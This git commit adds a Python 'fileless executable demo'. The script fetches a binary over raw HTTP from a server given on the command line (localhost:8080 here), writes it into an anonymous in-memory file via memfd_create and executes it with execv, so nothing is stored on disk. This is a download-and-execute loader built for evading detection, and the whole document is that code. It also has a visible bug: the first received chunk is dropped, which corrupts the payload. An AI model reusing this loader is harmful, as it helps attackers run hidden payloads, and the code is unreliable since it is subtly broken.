a50b2e1c56b5ab97222d4388989963bb1c53f606
tav-r <ig@tavr.li>
2021-03-07 09:24:14 +0100

    first commit with fileless executable demo

---
+++ fileless.py
@@ -0,0 +1,24 @@
+from ctypes import CDLL
+from os import execv
+from socket import socket
+from sys import argv
+
+PL_SRC = ("localhost", 8080)
+PL_PATH = argv[1]
+PARMS = argv[2:]
+
+s = socket()
+s.connect(PL_SRC)
+s.send(f"GET /{PL_PATH} HTTP/1.1\r\n\r\n".encode())
+
+RES = b""
+REC = s.recv(1024)
+while REC:
+    REC = s.recv(1024)
+    RES += REC
+
+path = f"/proc/self/fd/{CDLL('libc.so.6').memfd_create('a', 0)}"
+with open(path, "wb+") as memfile:
+    memfile.write(RES.split(b"\r\n\r\n", 2)[1])
+
+execv(path, [path] + PARMS)
